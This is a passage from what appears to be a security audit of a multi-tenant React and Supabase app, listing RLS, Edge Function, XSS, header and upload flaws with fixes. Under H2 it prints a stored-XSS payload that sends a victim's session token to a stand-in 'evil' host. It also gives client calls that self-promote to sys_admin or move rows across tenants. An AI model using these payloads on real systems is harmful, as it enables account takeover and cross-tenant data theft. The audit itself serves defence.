# LineUp Security Audit

**Date:** 2026-10-04
**Scope:** Vite + React 19 SPA, Supabase (Postgres/RLS/Storage/Edge Functions), multi-tenant via `tenant_id`
**Method:** Read-only static review of `src/`, `supabase/migrations/*.sql`, `supabase/functions/*/index.ts`, `vercel.json`, `index.html`, git history
**Commit baseline:** `d19a892` (main), plus uncommitted working-tree changes

> **Note on in-flight work.** During this audit the working tree was modified by a
> parallel process. `src/services/supabase.ts`, `src/hooks/useAuth.ts`,
> `src/services/api/auth.ts`, and new files (`src/lib/sessionPolicy.ts`,
> `src/hooks/useSessionTimeout.ts`, `src/components/providers/SessionTimeoutProvider.tsx`,
> `src/services/api/sessionSecurity.ts`, `supabase/migrations/068_session_security.sql`)
> now implement idle + absolute session timeouts, `signOut({scope:'global'})`, a
> service-role-key guard, and hardened `returnTo` validation. Those items are
> recorded in **§5 Already Remediated** rather than as open findings.

---

## Summary

| Severity | Count |
|---|---|
| Critical | 4 |
| High | 8 |
| Medium | 10 |
| Low | 7 |

The two highest-impact issues are a **tenant-role privilege-escalation path in RLS**
(an `org_admin` can promote themselves to `sys_admin`) and **two Edge Functions that
hold the service-role key with no caller authentication at all**.

---

## 1. Critical

### C1 — `org_admin` can self-promote to `sys_admin` (RLS UPDATE policy has no `WITH CHECK`)

**File:** `supabase/migrations/031_fix_user_creation_rls.sql:120-127`

```sql
CREATE POLICY "tenant_users_update_v2" ON tenant_users
    FOR UPDATE
    USING (
        public.is_sys_admin()
        OR public.is_org_admin_of_tenant(tenant_id)
    );
```

**What's wrong.** A Postgres `FOR UPDATE` policy with only `USING` validates the
*existing* row, never the *new* row. `tenant_users` is the authoritative role table —
`public.is_sys_admin()` (`supabase/migrations/039_fix_tenant_users_recursion.sql:45`)
reads it, as do all core policies in `043_fix_all_core_rls_policies.sql`.

An authenticated `org_admin` of tenant A passes `USING` for any row in tenant A,
including their own. With no `WITH CHECK`, they can then write any new values:

```js
// Authenticated as org_admin of tenant A
await supabase.from('tenant_users')
  .update({ role: 'sys_admin' })
  .eq('user_id', myUserId)
```

`is_sys_admin()` now returns true for them, granting read/write across **every
tenant** on the platform (`clients`, `projects`, `leads`, `passwords`,
`support_tickets`, `tenants`, …). The same gap also allows rewriting `tenant_id` or
`user_id` to insert an attacker-controlled account into another tenant.

**Fix.** Add a `WITH CHECK` that pins the immutable columns and forbids granting a
role above the caller's own:

```sql
DROP POLICY IF EXISTS "tenant_users_update_v2" ON tenant_users;

CREATE POLICY "tenant_users_update_v2" ON tenant_users
    FOR UPDATE
    USING (
        public.is_sys_admin()
        OR public.is_org_admin_of_tenant(tenant_id)
    )
    WITH CHECK (
        public.is_sys_admin()
        OR (
            public.is_org_admin_of_tenant(tenant_id)
            -- org_admin may never mint a sys_admin
            AND role <> 'sys_admin'
        )
    );
```

Additionally revoke column-level UPDATE on `role`/`tenant_id`/`user_id` from
`authenticated` and route all role changes through the existing
`public.update_tenant_user_role()` RPC (`058_update_user_role_rpc.sql:29`), which
performs its own checks. Audit production now for any `tenant_users` row whose
`role = 'sys_admin'` that you did not create.

---

### C2 — Password manager stores credentials in plaintext

**File:** `supabase/migrations/048_password_manager.sql:24`

```sql
password            TEXT NOT NULL,         -- stored credential
```

**What's wrong.** Shared agency credentials (AWS consoles, client Stripe accounts) are
stored as cleartext `TEXT`. `src/services/api/passwords.ts:67-80` inserts
`input.password` verbatim and `getAll`/`getById` `select('*')`, so the plaintext is
returned to the browser. Consequences:

- Any DB backup, logical dump, Supabase dashboard viewer, or leaked service-role key
  yields every tenant's credentials in the clear.
- Combined with **C1**, a self-promoted `sys_admin` reads every tenant's vault.
- Combined with **H2** (stored XSS), credentials are exfiltratable from the browser.
- There is **no access audit log** — no table or RPC records who read a credential
  (verified: no `password_access*` / `credential_access*` object anywhere in
  `supabase/` or `src/`), so a compromise is undetectable after the fact.

**Fix.** Treat the vault as envelope-encrypted data the database cannot read:

1. Add `password_ciphertext BYTEA`, `dek_wrapped BYTEA`, `nonce BYTEA`, drop the
   plaintext column after migration.
2. Encrypt/decrypt only inside an Edge Function holding a KMS-backed key
   (Supabase Vault or an external KMS). The anon-key client must never receive the
   decryption key, and `passwords.password` must never be in a `select('*')`.
3. Add `password_access_log (id, tenant_id, password_id, user_id, action, accessed_at, ip)`
   with an insert-only RLS policy; write a row on every reveal/copy.
4. Narrow the read path: replace `passwords.getById` `select('*')` with a reveal RPC
   that logs before returning the secret.

---

### C3 — `send-notification` Edge Function: service-role email relay with no caller authentication

**File:** `supabase/functions/send-notification/index.ts:160-190`

```ts
serve(async (req: Request): Promise<Response> => {
  if (req.method !== 'POST') { /* 405 */ }
  let payload: NotificationPayload
  let supabase: SupabaseClient
  try {
    payload = await req.json() as NotificationPayload
    supabase = createServiceClient()          // SUPABASE_SERVICE_ROLE_KEY
  } catch (err) { /* 400 */ }

  if (!payload.trigger_key || !payload.tenant_id || !payload.recipient_email) { /* 400 */ }
```

**What's wrong.** There is no `Authorization` header read, no `auth.getUser()`, and no
role check anywhere in the file (verified: the only `Authorization` occurrence is
line 141, the outbound Resend header). The handler immediately instantiates a
**service-role** client and then trusts three caller-supplied values:

- `tenant_id` → selects another tenant's `tenant_notification_settings` override
  (line 226-229)
- `recipient_email` → the `to:` address (line 294)
- `variables` → interpolated raw into the email body by `renderTemplate`
  (lines 64-69, 257-258), with no escaping

Supabase's platform `verify_jwt` gate accepts the **public anon key** as a valid JWT,
and that key ships in the client bundle (`VITE_SUPABASE_ANON_KEY`). So any internet
caller can send unlimited email from your verified Resend sender domain with
attacker-chosen HTML — a ready-made phishing relay against your own customers, plus
domain-reputation burn and Resend quota exhaustion. Every send is also written to
`notification_send_log` as service-role, letting an attacker pollute the audit trail.

**Fix.**

```ts
const authHeader = req.headers.get('Authorization')
if (!authHeader) return json(401, { error: 'Missing authorization header' })

const userClient = createClient(supabaseUrl, anonKey, {
  global: { headers: { Authorization: authHeader } },
})
const { data: { user }, error } = await userClient.auth.getUser()
if (error || !user) return json(401, { error: 'Invalid authentication' })

// tenant_id must be DERIVED, never accepted from the body
const { data: tenantIds } = await userClient.rpc('get_user_tenant_ids')
if (!tenantIds?.includes(payload.tenant_id)) return json(403, { error: 'Forbidden' })
```

Also: HTML-escape every value in `renderTemplate` before substitution; restrict
`recipient_email` to an address the caller's tenant owns (or derive it server-side
from the entity being notified); and add a per-tenant send quota. If the function is
only ever called from DB triggers (`061_notification_triggers.sql`), drop public
invocation entirely and gate on a shared secret header instead.

---

### C4 — `run-lead-automation` Edge Function: service-role, no caller authentication, cross-tenant `automation_id`

**File:** `supabase/functions/run-lead-automation/index.ts:90-152`

```ts
Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') return new Response('ok', { headers: corsHeaders })
  const supabaseServiceRoleKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!
  ...
  const adminClient = createClient(supabaseUrl, supabaseServiceRoleKey)
  ...
  const body: RequestBody = await req.json()
  const { automation_id, triggered_by, trigger_type } = body
  if (!automation_id) { /* 400 */ }

  const { data: automationData } = await adminClient
    .from('lead_automations')
    .select('*')
    .eq('id', automation_id)      // no tenant scoping, RLS bypassed
    .is('deleted_at', null)
    .single()
```

**What's wrong.** Same pattern as C3 — no `Authorization` header check, no
`auth.getUser()`, no role check — but here the service-role client reads and writes
business data. A caller supplying any `automation_id` (UUIDs are guessable only by
leak, but `automation_runs` rows and error messages can surface them) can:

- Execute another tenant's automation config and have the resulting leads written
  into **that** tenant (RLS is bypassed by the service-role client).
- Spend your `APIFY_API_TOKEN` credits without limit — unauthenticated financial DoS.
- Forge `triggered_by`, corrupting the `automation_runs` audit trail.

**Fix.** Add the same authenticate-then-authorize preamble as C3, then scope the
fetch to the caller's tenant:

```ts
const { data: { user }, error } = await userClient.auth.getUser()
if (error || !user) return json(401, { error: 'Invalid authentication' })

const { data: automationData } = await userClient   // user client, RLS enforced
  .from('lead_automations')
  .select('*')
  .eq('id', automation_id)
  .is('deleted_at', null)
  .single()
if (!automationData) return json(404, { error: 'Automation not found' })
// only now switch to adminClient for the privileged writes
```

Always set `triggered_by = user.id` server-side, ignoring the body. For the cron
path (`054_lead_automations_and_cron.sql:168 trigger_due_lead_automations`), accept a
`X-Automation-Secret` shared secret instead of a user JWT.

---

## 2. High

### H1 — 49 `SECURITY DEFINER` functions without `SET search_path`

**Files (representative, all 49 enumerated below):**
- `supabase/migrations/039_fix_tenant_users_recursion.sql:9` `get_user_tenant_ids`
- `supabase/migrations/039_fix_tenant_users_recursion.sql:45` `is_sys_admin`
- `supabase/migrations/042_fix_leads_rls_tenant_role_check.sql:12` `user_has_role_in_tenant`
- `supabase/migrations/031_fix_user_creation_rls.sql:11` `is_org_admin_of_tenant`
- `supabase/migrations/029_tenant_storage_rls.sql:12,47,150`
- `supabase/migrations/048_password_manager.sql:92` `is_org_admin_of_tenant`
- `supabase/migrations/016_server_side_rate_limiting.sql:57,128,172`
- `supabase/migrations/018_sysadmin_rls_and_tenant_deletion.sql:24,71,95,139`
- `supabase/migrations/010_fix_schema_and_constraints.sql:110,142`
- plus `003:23`, `004:86`, `011:39`, `012:13`, `025:121,183,243`, `026:72,690,783`,
  `027:18`, `028:112,323`, `035:7`, `036:8`, `037:7`, `040:9`, `041:36`,
  `045:693`, `046:709`, `047:653,687`, `054:168`, `058:8,29`,
  `061:37,189,305`, `062:13,146`, `065:16,168`

**What's wrong.** 49 of 58 `SECURITY DEFINER` functions omit
`SET search_path`. A `SECURITY DEFINER` function runs with the owner's privileges
(`postgres`/superuser) but resolves unqualified names using the **caller's**
`search_path`. In default Supabase projects the `public` schema is `GRANT`ed to
`authenticated`, so a logged-in user can create a shadowing object and have the
superuser-owned function call it:

```sql
-- as an ordinary authenticated user
CREATE TABLE public.tenant_users_shadow (...);
SET search_path TO evil, public;   -- then call is_sys_admin()
```

The most dangerous targets are exactly the functions that back every RLS policy —
`is_sys_admin()`, `get_user_tenant_ids()`, `user_has_role_in_tenant()`,
`is_org_admin_of_tenant()`. Shadowing the `tenant_users` reference inside them turns
the entire multi-tenant boundary off. `026_v2_features.sql:72
seed_document_catalog_for_tenant` and `018:95 permanently_delete_tenant` additionally
run destructive DDL/DML as superuser.

**Fix.** Append `SET search_path = public, pg_temp` to every `SECURITY DEFINER`
function and schema-qualify all object references inside their bodies. One migration:

```sql
-- 069_harden_security_definer_search_path.sql
ALTER FUNCTION public.is_sys_admin()                            SET search_path = public, pg_temp;
ALTER FUNCTION public.get_user_tenant_ids()                     SET search_path = public, pg_temp;
ALTER FUNCTION public.user_has_role_in_tenant(uuid, text[])     SET search_path = public, pg_temp;
ALTER FUNCTION public.is_org_admin_of_tenant(uuid)              SET search_path = public, pg_temp;
-- … repeat for all 49
```

Then belt-and-braces: `REVOKE CREATE ON SCHEMA public FROM authenticated, anon;`

Verify afterwards with:

```sql
SELECT p.oid::regprocedure, p.proconfig
FROM pg_proc p JOIN pg_namespace n ON n.oid = p.pronamespace
WHERE n.nspname = 'public' AND p.prosecdef
  AND (p.proconfig IS NULL OR NOT EXISTS (
        SELECT 1 FROM unnest(p.proconfig) c WHERE c LIKE 'search_path=%'));
```

---

### H2 — Stored XSS: Tiptap rich-text rendered via `dangerouslySetInnerHTML` with no sanitizer

**Files:**
- `src/components/shared/RichTextEditor.tsx:223`
- `src/components/shared/NotesPanel.tsx:293`

```tsx
// RichTextEditor.tsx:223 (readOnly branch)
dangerouslySetInnerHTML={{ __html: content || '<p class="text-muted-foreground italic">No content</p>' }}

// NotesPanel.tsx:293
dangerouslySetInnerHTML={{ __html: note.description }}
```

**What's wrong.** `content` / `note.description` is HTML produced by Tiptap
(`editor.getHTML()`, `RichTextEditor.tsx:204`) and round-tripped through the database.
There is **no sanitizer anywhere in the project** — `package.json` has no
`dompurify`, `sanitize-html`, or `xss` dependency, and `src/lib/security.ts:126
sanitizeString` is not applied on this path. Tiptap's editor UI will not *produce*
a `<script>`, but the stored value is an ordinary user-writable `TEXT` column: any
tenant member can `PATCH` `notes.description` (or any entity description) directly
through PostgREST with the anon key and a valid JWT:

```js
await supabase.from('notes')
  .update({ description: '<img src=x onerror="fetch(\'//evil/?\'+localStorage.getItem(Object.keys(localStorage).find(k=>k.startsWith(\'sb-\'))))">' })
  .eq('id', noteId)
```

Every teammate who views that note executes the payload. Because Supabase persists
the session in `localStorage` (`src/services/supabase.ts:42 persistSession: true`),
the payload reads the access **and refresh** token directly. With **H3** (no CSP) there
is nothing to block the exfiltration request, and with **C2** the attacker can then
pull the whole plaintext password vault. An `org_admin` payload chained with **C1**
escalates to platform-wide `sys_admin`.

**Fix.** Sanitize at render, and keep both sinks on one helper:

```bash
npm i dompurify && npm i -D @types/dompurify
```

```tsx
// src/lib/sanitizeHtml.ts
import DOMPurify from 'dompurify'

const ALLOWED_TAGS = ['p','br','strong','em','u','s','h1','h2','h3','ul','ol','li',
                      'blockquote','pre','code','a','span']

export function sanitizeRichText(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS,
    ALLOWED_ATTR: ['href', 'target', 'rel', 'class'],
    ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|#|\/)/i,
    FORBID_ATTR: ['style', 'srcset'],
  })
}
```

Then `__html: sanitizeRichText(content)` at `RichTextEditor.tsx:223` and
`__html: sanitizeRichText(note.description)` at `NotesPanel.tsx:293`. Add a
`DOMPurify.sanitize` pass on write as well (defence in depth), and grep for any new
`dangerouslySetInnerHTML` in CI.

---

### H3 — No security headers: `vercel.json` has only rewrites

**Files:** `vercel.json:1-5`, `index.html:1-13`

```json
{
  "rewrites": [
    { "source": "/(.*)", "destination": "/index.html" }
  ]
}
```

**What's wrong.** There is no `headers` block, and `index.html` carries no
`<meta http-equiv>` fallback. The app ships with no `Content-Security-Policy`,
`Strict-Transport-Security`, `X-Frame-Options`/`frame-ancestors`,
`X-Content-Type-Options`, `Referrer-Policy`, or `Permissions-Policy`. Concretely:

- No CSP → the **H2** payload can exfiltrate to any origin unimpeded.
- No `frame-ancestors`/`X-Frame-Options` → the app can be framed for clickjacking
  against the destructive admin actions in `AdminTenantDetailPage` / `permanently_delete_tenant`.
- No `Referrer-Policy` → full URLs (which embed entity UUIDs under
  `/clients/:id`, `/projects/:id`) leak to third parties via the `Referer` header,
  including from the user-controlled `target="_blank"` links at
  `src/pages/competitors/CompetitorsPage.tsx:219` and `src/pages/passwords/PasswordsPage.tsx:220`.
- No HSTS → TLS-stripping on first contact.

**Fix.** Add to `vercel.json` (keep the existing `rewrites`):

```json
{
  "rewrites": [{ "source": "/(.*)", "destination": "/index.html" }],
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob: https://*.supabase.co; connect-src 'self' https://*.supabase.co wss://*.supabase.co; frame-ancestors 'none'; base-uri 'none'; object-src 'none'; form-action 'self'" },
        { "key": "Strict-Transport-Security", "value": "max-age=63072000; includeSubDomains; preload" },
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Permissions-Policy", "value": "camera=(), microphone=(), geolocation=(), payment=()" },
        { "key": "Cross-Origin-Opener-Policy", "value": "same-origin" }
      ]
    }
  ]
}
```

Vite emits hashed, non-inline bundles, so `script-src 'self'` works without
`unsafe-inline`. Roll out behind `Content-Security-Policy-Report-Only` first if you
want a safety net.

---

### H4 — `record_login_attempt` is granted to `anon` and resets the rate limiter

**Files:**
- `supabase/migrations/016_server_side_rate_limiting.sql:196` (grant)
- `supabase/migrations/016_server_side_rate_limiting.sql:128-165` (function)

```sql
GRANT EXECUTE ON FUNCTION record_login_attempt TO anon, authenticated;
```

```sql
CREATE OR REPLACE FUNCTION record_login_attempt(
    p_email TEXT, p_success BOOLEAN, ...
) ... SECURITY DEFINER AS $$
BEGIN
    INSERT INTO login_attempts (...) VALUES (LOWER(p_email), ..., p_success, ...);

    IF p_success THEN
        DELETE FROM login_attempts
        WHERE email = LOWER(p_email) AND success = FALSE AND attempted_at < NOW();
    END IF;
END; $$;
```

**What's wrong.** The function is callable by `anon` and takes `p_success` as a
*parameter* — it never verifies that a login actually occurred. Two abuses:

1. **Rate limiter is fully bypassable.** `check_rate_limit`
   (`016:57-122`) blocks after 5 failed attempts in the window. An attacker
   brute-forcing a password calls `rpc('record_login_attempt', {p_email: victim, p_success: true})`
   between guesses; the `DELETE` wipes the failure history and the counter resets to
   zero. The app's brute-force protection becomes decorative.
2. **Targeted account-lockout DoS.** Conversely, 5 anonymous calls with
   `p_success: false` for any known email block that user for `block_seconds` (300s),
   repeatable indefinitely. No authentication, no CAPTCHA, no IP binding.

Enforcement is also purely client-side: `src/services/api/auth.ts:67-88` calls
`check_rate_limit` from the browser before `signInWithPassword`. An attacker hitting
`/auth/v1/token` directly skips the check entirely (only Supabase's platform limits
remain).

**Fix.**

```sql
-- 069: stop trusting the caller
REVOKE EXECUTE ON FUNCTION record_login_attempt(text, boolean, text, text, text) FROM anon, authenticated;
REVOKE EXECUTE ON FUNCTION check_rate_limit(text, text) FROM anon, authenticated;
```

Move both calls into an Edge Function that performs the `signInWithPassword` itself,
so `p_success` is derived from the real auth result and never supplied by the client.
Bind the counter to `(email, ip_address)` using the request IP rather than email
alone, so one attacker cannot lock out an arbitrary account. Remove the
`IF p_success THEN DELETE` block — expire rows by window instead (the
`cleanup_login_attempts` job at `016:172` already does this). Keep Supabase's
built-in auth rate limits enabled as the real backstop.

---

### H5 — `send-waitlist-welcome` webhook has no shared-secret verification

**File:** `supabase/functions/send-waitlist-welcome/index.ts:121-165`

```ts
serve(async (req: Request): Promise<Response> => {
  if (req.method !== 'POST') { /* 405 */ }
  let payload: WebhookPayload
  try { payload = await req.json() as WebhookPayload } catch { /* 400 */ }

  if (payload.type !== 'INSERT' || payload.table !== 'leads') { /* skipped */ }
  const lead = payload.record
  if (!lead.email) { /* skipped */ }
  ...
  const supabase = createServiceClient()
```

**What's wrong.** This is a database-webhook receiver, but nothing distinguishes a
real Supabase webhook from a forged request — no signature check, no shared secret,
no IP allowlist (verified: the only `Authorization` reference in the file is the
outbound Resend header at line 100). The handler accepts an attacker-authored
`payload.record` and sends a Resend email to `lead.email`, then uses the
service-role client for the follow-up writes. Same practical outcome as **C3**:
an unauthenticated email relay on your sending domain, driven entirely by
attacker-supplied fields.

**Fix.** Configure the webhook in Supabase with a custom header and verify it before
any work, using a timing-safe comparison:

```ts
const secret = Deno.env.get('WAITLIST_WEBHOOK_SECRET')!
const provided = req.headers.get('x-webhook-secret') ?? ''
const enc = new TextEncoder()
const ok = provided.length === secret.length &&
  crypto.subtle.timingSafeEqual?.(enc.encode(provided), enc.encode(secret))
if (!ok) return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401 })
```

(If `timingSafeEqual` is unavailable, compare HMAC-SHA256 digests of both values.)
Then re-read the lead from the database by `payload.record.id` through the
service-role client rather than trusting the posted `record`, and HTML-escape every
lead-derived value before template substitution.

---

### H6 — Storage `UPDATE` policy has no `WITH CHECK`: files can be moved across tenants

**File:** `supabase/migrations/029_tenant_storage_rls.sql:127-133`

```sql
CREATE POLICY "tenant_update_policy" ON storage.objects
    FOR UPDATE
    TO authenticated
    USING (
        bucket_id = 'documents' AND
        public.validate_storage_tenant_path(name)
    );
```

**What's wrong.** Same `USING`-only defect as **C1**, applied to object keys.
`storage.objects.name` *is* the tenant boundary here —
`validate_storage_tenant_path` (`029:47-82`) parses the first path segment as a
tenant UUID and checks membership. With no `WITH CHECK`, an authenticated user
passes the check on their own object and may then rewrite `name` to any value,
including `{other_tenant_uuid}/...`. That plants a file inside another tenant's
namespace (and, because the three sibling policies all key off the first segment,
hands read access over to that tenant) — or moves a file out of the victim's reach.
`bucket_id` is likewise unconstrained on the new row.

Note the three companion policies (`029:109,118,136`) are correctly formed; only
UPDATE is affected.

**Fix.**

```sql
DROP POLICY IF EXISTS "tenant_update_policy" ON storage.objects;

CREATE POLICY "tenant_update_policy" ON storage.objects
    FOR UPDATE
    TO authenticated
    USING (
        bucket_id = 'documents' AND public.validate_storage_tenant_path(name)
    )
    WITH CHECK (
        bucket_id = 'documents' AND public.validate_storage_tenant_path(name)
    );
```

Also add `SET search_path = public, pg_temp` to `validate_storage_tenant_path` and
`get_storage_tenant_id` (covered by **H1**) — these two are the storage boundary and
are currently shadowable.

---

### H7 — 30 live `UPDATE` policies omit `WITH CHECK` (tenant-hopping on business data)

**Files (last-defined, therefore live, policy per table):**

| File:line | Table | Policy |
|---|---|---|
| `043_fix_all_core_rls_policies.sql:84` | `projects` | `projects_update_policy` |
| `043_fix_all_core_rls_policies.sql:130` | `project_phases` | `project_phases_update_policy` |
| `043_fix_all_core_rls_policies.sql:176` | `sets` | `sets_update_policy` |
| `043_fix_all_core_rls_policies.sql:222` | `requirements` | `requirements_update_policy` |
| `043_fix_all_core_rls_policies.sql:314` | `pitches` | `pitches_update_policy` |
| `043_fix_all_core_rls_policies.sql:360` | `client_contacts` | `client_contacts_update_policy` |
| `044_ensure_rls_functions_exist.sql:104` | `clients` | `clients_update_policy` |
| `044_ensure_rls_functions_exist.sql:145` | `leads` | `leads_update_policy` |
| `044_ensure_rls_functions_exist.sql:186` | `contacts` | `contacts_update_policy` |
| `044_ensure_rls_functions_exist.sql:227` | `lead_contacts` | `lead_contacts_update_policy` |
| `049_fix_password_rls.sql:27` | `passwords` | `passwords_update_org_admin` |
| `050_financial_manager.sql:224` | `financial_groups` | `fin_groups_update` |
| `050_financial_manager.sql:247` | `financial_entries` | `fin_entries_update` |
| `050_financial_manager.sql:270` | `financial_occurrences` | `fin_occurrences_update` |
| `051_competitor_tracker.sql:122` | `competitors` | `competitors_update` |
| `054_lead_automations_and_cron.sql:113` | `lead_automations` | `lead_automations_update_policy` |
| `054_lead_automations_and_cron.sql:147` | `automation_runs` | `automation_runs_update_policy` |
| `060_notifications_system.sql:169` | `tenant_notification_settings` | `..._org_admin_update` |
| `060_notifications_system.sql:54` | `notification_email_config` | `..._sys_admin_update` |
| `028_notes_and_storage.sql:61` | `notes` | `notes_update_policy` |
| `026_v2_features.sql:53` | `document_catalog` | `document_catalog_update_policy` |
| `025_closed_loop_user_model.sql:54` | `client_users` | `client_users_update_policy` |
| `033_support_tickets.sql:84` | `support_tickets` | `org_admin_tenant_update` |
| `033_support_tickets.sql:114` | `support_tickets` | `user_update_own_open_tickets` |
| `015_requirements_client_id_and_optional_set.sql:73` | `requirements` | `Users can update requirements` |
| `011_fix_rpc_and_client_contacts.sql:185` | `client_contacts` | `Users can update client_contacts` |
| `002_comprehensive_update.sql:282` | `contacts` | `Users can update contacts in their tenants` |
| `018_sysadmin_rls_and_tenant_deletion.sql:61` | `user_profiles` | `user_profiles_update_policy` |
| `018_sysadmin_rls_and_tenant_deletion.sql:206` | `tenants` | `sys_admin_update_tenants` |
| `031_fix_user_creation_rls.sql:77` | `user_profiles` | `user_profiles_update_v2` |

Representative (`043:38-45`, the pattern repeated across all of `043`/`044`):

```sql
CREATE POLICY "clients_update_policy" ON clients
    FOR UPDATE USING (
        (
            tenant_id IN (SELECT public.get_user_tenant_ids())
            AND public.user_has_role_in_tenant(tenant_id, ARRAY['sys_admin','org_admin','org_user'])
        )
        OR public.is_sys_admin()
    );
```

**What's wrong.** Every one of these validates only the pre-update row. An
`org_user` in tenant A can therefore rewrite `tenant_id` on any record they can
already edit, pushing it into tenant B:

```js
await supabase.from('clients').update({ tenant_id: OTHER_TENANT }).eq('id', clientId)
```

The row vanishes from tenant A and materialises inside tenant B — silent
cross-tenant data injection, and for `leads`/`clients`/`projects` a destructive
data-integrity failure. On `support_tickets:114` a user can additionally rewrite
`submitted_by` and `status` on their own ticket. `financial_*` and `passwords` make
the same gap available for financial and credential records. (`018:206` and
`060:54` are `sys_admin`-only, so low real impact, but fix them for consistency.)

**Fix.** Mirror each `USING` into a `WITH CHECK`. A single migration, generated per
table — for the `043`/`044` family:

```sql
-- 069_add_with_check_to_update_policies.sql
DROP POLICY IF EXISTS "clients_update_policy" ON clients;
CREATE POLICY "clients_update_policy" ON clients
    FOR UPDATE
    USING (
        (tenant_id IN (SELECT public.get_user_tenant_ids())
         AND public.user_has_role_in_tenant(tenant_id, ARRAY['sys_admin','org_admin','org_user']))
        OR public.is_sys_admin()
    )
    WITH CHECK (
        (tenant_id IN (SELECT public.get_user_tenant_ids())
         AND public.user_has_role_in_tenant(tenant_id, ARRAY['sys_admin','org_admin','org_user']))
        OR public.is_sys_admin()
    );
-- repeat for projects, project_phases, sets, requirements, pitches, client_contacts,
-- leads, contacts, lead_contacts, notes, document_catalog, client_users,
-- financial_groups, financial_entries, financial_occurrences, competitors,
-- lead_automations, automation_runs, support_tickets, tenant_notification_settings,
-- passwords, user_profiles, tenants, notification_email_config
```

Better still, make `tenant_id` immutable at the schema level so the policy cannot be
the only guard:

```sql
CREATE OR REPLACE FUNCTION public.forbid_tenant_id_change()
RETURNS TRIGGER LANGUAGE plpgsql SET search_path = public, pg_temp AS $$
BEGIN
  IF NEW.tenant_id <> OLD.tenant_id THEN
    RAISE EXCEPTION 'tenant_id is immutable';
  END IF;
  RETURN NEW;
END; $$;
-- attach BEFORE UPDATE on every tenant-scoped table
```

Add a CI check that fails on any `FOR UPDATE` policy lacking `WITH CHECK`.

---

### H8 — File upload has no MIME allowlist, no extension allowlist, and no size cap

**File:** `src/services/api/documents.ts:271-325`

```ts
uploadFile: async (tenantId: string, file: File) => {
  // Sanitize filename: replace spaces with underscores
  const sanitizedName = file.name.replace(/\s+/g, '_')
  const fileName = `${tenantId}/${Date.now()}_${sanitizedName}`

  const { data: uploadData, error: uploadError } = await supabase.storage
    .from('documents')
    .upload(fileName, file)
  ...
  return { file_url: uploadData.path, file_type: file.type, file_size_bytes: file.size }
}
```

**What's wrong.** No validation of `file.type`, no extension allowlist, and no byte
limit before the call — the only brake is whatever the bucket was created with by
hand (`supabase/storage-setup.sql:14` only *comments* `{ public: false }`; no
`file_size_limit` or `allowed_mime_types` is set anywhere in the repo). Consequences:

- A user uploads `payload.html` or `payload.svg`; `documentsApi.getSignedUrl`
  (`documents.ts:422-428`) hands out a signed URL that Supabase serves with the
  stored `Content-Type`. The attacker gets attacker-controlled script executing on
  the `*.supabase.co` origin — not the app origin, but a convincing phishing page on
  a domain the user associates with your product, and able to read anything scoped to
  that storage origin.
- No size cap → one request can exhaust storage quota and run up egress cost
  (unauthenticated-adjacent financial DoS, since any tenant member can do it).
- `file_type` is stored from the client-supplied `file.type`, so the recorded MIME
  can disagree with the bytes.

**Fix.** Validate before upload and again at the bucket:

```ts
const ALLOWED = new Map<string, string[]>([
  ['application/pdf', ['pdf']],
  ['image/png', ['png']],
  ['image/jpeg', ['jpg', 'jpeg']],
  ['application/vnd.openxmlformats-officedocument.wordprocessingml.document', ['docx']],
  ['application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', ['xlsx']],
  ['text/csv', ['csv']],
])
const MAX_BYTES = 25 * 1024 * 1024

const ext = file.name.split('.').pop()?.toLowerCase() ?? ''
if (!ALLOWED.has(file.type) || !ALLOWED.get(file.type)!.includes(ext)) {
  throw new Error('Unsupported file type')
}
if (file.size > MAX_BYTES) throw new Error('File exceeds 25 MB limit')

// strip path separators and leading dots from the stored key
const safeName = file.name.replace(/[^\w.\-]+/g, '_').replace(/^\.+/, '')
const fileName = `${tenantId}/${Date.now()}_${safeName}`

await supabase.storage.from('documents').upload(fileName, file, {
  contentType: file.type,
  upsert: false,
})
```

And pin it server-side, which the client cannot bypass:

```sql
UPDATE storage.buckets
SET public = false,
    file_size_limit = 26214400,
    allowed_mime_types = ARRAY['application/pdf','image/png','image/jpeg',
      'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet','text/csv']
WHERE id = 'documents';
```

Force downloads rather than inline rendering by passing
`download: true` (or a `Content-Disposition: attachment` transform) when creating
signed URLs for any non-image type.

---

## 3. Medium

### M1 — RLS policies check `role` without `status = 'active'`: deactivated members keep access

**Files (live policies):**
- `supabase/migrations/033_support_tickets.sql:64` `sys_admin_full_access` — **global**, all tenants
- `supabase/migrations/033_support_tickets.sql:74,84` `org_admin_tenant_access`, `org_admin_tenant_update`
- `supabase/migrations/028_notes_and_storage.sql:52,61,70` `notes_*_policy`
- `supabase/migrations/026_v2_features.sql:44,53,62` `document_catalog_*_policy`
- `supabase/migrations/025_closed_loop_user_model.sql:43,54,65` `client_users_*_policy`
- `supabase/migrations/011_fix_rpc_and_client_contacts.sql:173,185,197` `client_contacts` (insert/update/delete)
- `supabase/migrations/002_comprehensive_update.sql:277,282,287` `contacts` (insert/update/delete)
- `supabase/migrations/015_requirements_client_id_and_optional_set.sql:58,73,82` `requirements` (insert/update/delete)

```sql
-- 033_support_tickets.sql:64
CREATE POLICY "sys_admin_full_access" ON support_tickets
    FOR ALL USING (
        EXISTS (SELECT 1 FROM tenant_users
                WHERE user_id = auth.uid() AND role = 'sys_admin')
    );
```

**What's wrong.** `tenant_users.status` is the offboarding switch — `authApi.getUserTenants`
(`src/services/api/auth.ts:212`) and the canonical helpers
(`is_sys_admin`, `get_user_tenant_ids`, `user_has_role_in_tenant`,
`is_org_admin_of_tenant`) all filter on `status = 'active'`. These 21 policies do
not. A user whose membership was set to inactive/suspended therefore still passes
them. `033:64` is the worst case: a revoked `sys_admin` retains read/write on
**every tenant's** support tickets, which carry the "magic context" (URLs, tenant
IDs, user IDs) from the ticket system.

**Fix.** Replace each inline `EXISTS` with the canonical helpers, which already
enforce `status`:

